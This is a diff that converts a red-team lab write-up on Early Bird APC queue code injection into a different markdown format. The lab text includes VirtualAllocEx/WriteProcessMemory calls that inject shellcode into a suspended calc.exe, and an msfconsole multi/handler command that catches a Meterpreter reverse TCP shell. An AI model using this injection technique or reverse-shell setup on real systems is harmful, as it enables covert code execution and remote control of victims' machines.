@@ -2,9 +2,9 @@
 
 This short lab is related to a different version of the APC queue code injection technique I tinkered with here:
 
-{% content-ref url="apc-queue-code-injection.md" %}
+
 [apc-queue-code-injection.md](apc-queue-code-injection.md)
-{% endcontent-ref %}
+
 
 ## Overview
 
@@ -26,7 +26,7 @@ Below image (top) shows that I've hit the breakpoint on line 19, meaning that a 
 
 If we check the newly started `calc.exe` in the Process Hacker, we can confirm that the main thread is indeed `suspended` (bottom):
 
-![](<../../.gitbook/assets/Annotation 2019-05-27 140139.png>)
+![[Annotation 2019-05-27 140139.png]]
 
 After line 19 is executed, we get the address of the newly allocated memory. This is where the shellcode will be written to:
 
@@ -34,7 +34,7 @@ After line 19 is executed, we get the address of the newly allocated memory. Thi
 LPVOID shellAddress = VirtualAllocEx(victimProcess, NULL, shellSize, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
 ```
 
-![](<../../.gitbook/assets/Annotation 2019-05-27 140326.png>)
+![[Annotation 2019-05-27 140326.png]]
 
 Below shows how the shellcode gets written to memory address `0000023b82480000` of the `calc.exe` with:
 
@@ -42,24 +42,23 @@ Below shows how the shellcode gets written to memory address `0000023b82480000` 
 WriteProcessMemory(victimProcess, shellAddress, buf, shellSize, NULL);
 ```
 
-![](../../.gitbook/assets/writing-shellcode.gif)
+![[writing-shellcode.gif]]
 
 Before continuing, let's fire up a multi handler on the attacking system so we can catch the meterpreter session:
 
-{% code title="attacker@kali" %}
 ```csharp
+// attacker@kali
 msfconsole -x "use exploits/multi/handler; set lhost 10.0.0.5; set lport 443; set payload windows/x64/meterpreter/reverse_tcp; exploit"
 ```
-{% endcode %}
 
 Back to executing the malicious code - once the shellcode is written into the process memory, the APC is queued to the thread which is then immediately resumed. Resuming the thread in turn executes the shellcode which results in a meterpreter session:
 
-![](../../.gitbook/assets/apc-meterpreter.gif)
+![[apc-meterpreter.gif]]
 
 ## Code
 
-{% code title="earlybird-apc.cpp" %}
 ```cpp
+// earlybird-apc.cpp
 #include "pch.h"
 #include <Windows.h>
 
@@ -84,10 +83,9 @@ int main()
 	return 0;
 }
 ```
-{% endcode %}
 
 ## References
 
-{% embed url="https://www.cyberbit.com/blog/endpoint-security/new-early-bird-code-injection-technique-discovered/" %}
+[www.cyberbit.com/blog/endpoint-security/new-early-bird-code-injection-technique-discovered](https://www.cyberbit.com/blog/endpoint-security/new-early-bird-code-injection-technique-discovered/)
 
-{% embed url="https://www.youtube.com/watch?time_continue=29&v=_sI76NLPMjI" %}
+[www.youtube.com/watch?time_continue=29&v=_sI76NLPMjI](https://www.youtube.com/watch?time_continue=29&v=_sI76NLPMjI)
